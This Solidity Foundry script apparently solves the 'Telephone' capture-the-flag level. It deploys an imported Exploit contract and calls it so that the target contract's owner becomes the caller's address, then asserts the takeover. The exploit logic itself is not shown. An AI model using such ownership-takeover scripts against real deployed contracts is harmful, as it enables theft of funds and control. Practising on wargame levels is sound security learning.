// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "src/telephone/Telephone.sol";
import "src/telephone/Exploit.sol";

contract TelephoneScript is Script {
    function yoink(address eoa, Telephone target) public {
        vm.startBroadcast(eoa);
        Exploit exploit = new Exploit();
        exploit.bonk(target);
        assert(target.owner() == eoa);
    }
}
